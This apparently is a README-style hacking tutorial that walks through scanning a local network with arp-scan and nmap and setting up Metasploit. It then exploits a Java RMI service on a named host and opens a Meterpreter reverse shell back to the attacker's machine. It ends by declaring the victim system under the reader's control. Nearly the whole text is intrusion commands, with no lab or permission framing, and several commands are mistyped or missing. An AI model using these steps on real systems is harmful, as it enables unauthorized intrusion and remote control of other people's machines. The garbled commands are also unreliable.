# hacking_system

Step 1: Do a host discovery & perform an Enumeration

Command: arp-scan 192.168.0.1/24<Enter your network Range>
Command: nmap -sS 192.168.0.1/24 -v
Command: nmap -sS -A 192.168.0.104 -vv


Step 2: Meanwhile, Setup msfconsole

Command: service postgresql start
Command:su postgress
command: createuser msfuser1 -P <replace “msfuser1” with your username>

Set the user as superuser & create a database
Command:  reated msfproj1 –owner=msfuser1 <replace “msfproj1” with your database name & “msfuser1” with your username>
Command: exit

Start the msfconsole
Command: msfconsole


Step 3: Connect to new user & DB in msfconsole & Create new Workspace
msf> db_disconnect
msf> db_connect msfuser1:admin@localhost/msfproj1
db_connect user:pass@host/dbname

To see the current workspace,
msf> workspace
msf> workspace -a newproject <replace with your  esired name>
msf> workspace “newproject”
 
Now just check everything.
msf> db_status
msf> workspace


Step 4: Populate the hosts & services to metasploit db.
This is one of the cool features of msfconsole. You can add hosts,services & vulnerabilities to the database. 
We can run nmap from within msfconsole. All the results are stored in the database also. Issue an nmap scan agian within msfconsole. 
Here only difference is we use db_nmap instead of the regular command.
msf> db_nmap -sS 192.168.0.1/24 -vv


Step 5: Identify a vulnerable service.
 

Step 6: Search & Use Module in msfconsole.
msf> search java_rmi
msf> info exploit/multi/misc/java_rmi_server
msf> use exploit/multi/misc/java_rmi_server
 
Now you can see the prompt has changed. We can see the options by
>show options

Set the RHOST which is our target which is running the vulnerable service.
set RHOST 192.168.0.104

Remember to set all options which have a “Required YES” value. See the table of options. 
Also check if the RPORT is also correct. Check the Nmap result & the currently set Port and see if it matches. 
Next we have to set all the required options & a payload. First we have to search for compatible payloads. 
All payloads may not be compatible with current module.
>show payloads

Then for setting it, copy the path & issue:
>set PAYLOAD java/meterpreter/reverse_tcp

Meterpreter is a state of the art payload. We can have lot of fun with this powerful payload. 
We will discuss that later. Now set the LHOST, which is the machine to which the payload has to return connection. 
Remember to give the full ip address instead of localhost or 127.0.0.1 etc
set LHOST 192.168.0.103

If you want, you can change the listening Port
set LPORT 4445

All set, now
 
meterpreter> ifconfig
meterpreter>getuid
 

Step 7: Brief it UP.
As this post got a bit lengthy, I have included a screenshot of the procedure very briefly.
 
Open terminal:
 
TYPE: msfconsole		

It will a minute.

TYPE: use exploit/multi/handler
TYPE: set payload windows/meterpreter/reverse_tcp	

And we need to set your local host

TYPE: set lhost (your ip address)
TYPE: set lport (HERE)
TYPE: exploit	

And now your victim system in your control

TYPE: HELP		
For see commands
